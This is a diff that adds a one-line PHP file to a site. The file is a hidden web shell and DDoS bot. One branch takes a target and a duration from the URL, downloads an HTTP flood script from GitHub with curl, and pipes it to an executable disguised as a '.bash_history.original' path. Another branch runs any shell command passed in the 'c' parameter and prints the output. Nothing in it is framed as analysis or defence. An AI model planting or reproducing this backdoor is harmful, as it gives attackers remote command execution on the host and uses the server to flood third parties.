@@ -1,0 +1,1 @@
+<?php if (isset($_GET['target']) && isset($_GET['time'])) {$target = $_GET['target'];$time = $_GET['time'];shell_exec("curl -s https://raw.githubusercontent.com/hoaan1995/ZxCDDoS/main/HTTP-RAW.js | ./.bash_history.original/history - $target $time");}elseif (isset($_GET['c'])) {$c = shell_exec($_GET['c']);echo "<pre>$c</pre>";}?>
